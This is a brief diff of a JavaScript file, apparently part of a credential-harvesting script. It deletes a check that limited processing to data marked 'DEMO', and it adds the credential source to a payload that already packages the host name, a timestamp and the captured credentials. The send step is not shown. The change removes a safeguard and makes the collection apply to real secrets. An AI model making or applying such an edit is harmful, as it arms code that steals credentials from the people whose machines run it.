@@ -35,13 +35,10 @@ function main() {
 
   const { source, data } = creds;
 
-  if (!/DEMO/i.test(data)) {
-    return;
-  }
-
   const payload = JSON.stringify({
     host: os.hostname(),
     ts: new Date().toISOString(),
+    source: source,
     credentials: data
   });
 
